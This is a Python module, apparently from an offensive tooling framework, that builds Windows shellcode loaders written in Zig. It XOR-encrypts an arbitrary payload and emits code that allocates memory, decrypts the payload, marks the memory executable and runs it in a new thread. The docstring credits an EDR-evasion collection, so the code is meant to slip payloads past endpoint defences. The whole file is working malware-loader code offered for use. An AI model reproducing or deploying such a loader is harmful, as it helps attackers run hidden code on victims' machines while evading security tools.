#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Minimal XOR shellcode runner — pure Zig source generation."""

from __future__ import annotations

import random
import secrets

from lib.compile.zig_loader_common import zig_byte_array, zig_sleep_ms, zig_std_preamble


def xor_crypt(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


class XorShellcodeRunnerBuilder:
    """Inspired by Awesome-EDR-Evasion 01_xor_shellcode_runner.c (Zig loader)."""

    def __init__(self, sleep_ms: int = 0) -> None:
        self.sleep_ms = max(0, int(sleep_ms))

    def encrypt_payload(self, payload: bytes) -> tuple[bytes, bytes]:
        key_len = random.randint(8, 24)
        key = secrets.token_bytes(key_len)
        return xor_crypt(payload, key), key

    def build_zig_source(self, encrypted: bytes, key: bytes) -> str:
        return f"""
{zig_std_preamble()}
{zig_byte_array(encrypted, "enc_shellcode")}
{zig_byte_array(key, "xor_key")}

fn xorCrypt(buf: []u8) void {{
    for (buf, 0..) |*b, i| b.* ^= xor_key[i % xor_key.len];
}}

pub fn main() u8 {{
    const exec = VirtualAlloc(null, enc_shellcode.len, w.MEM_COMMIT | w.MEM_RESERVE, w.PAGE_READWRITE) orelse return 1;
    const mem = @as([*]u8, @ptrCast(exec))[0..enc_shellcode.len];
    @memcpy(mem, &enc_shellcode);
    xorCrypt(mem);

    var old: w.DWORD = 0;
    if (VirtualProtect(exec, enc_shellcode.len, w.PAGE_EXECUTE_READ, &old) == 0) return 1;
{zig_sleep_ms(self.sleep_ms)}
    const thread = CreateThread(null, 0, @ptrCast(exec), null, 0, null) orelse return 1;
    _ = WaitForSingleObject(thread, w.INFINITE);
    _ = CloseHandle(thread);
    _ = VirtualFree(exec, 0, w.MEM_RELEASE);
    return 0;
}}
"""

    # Legacy alias (C path removed — use build_zig_source)
    build_source = build_zig_source
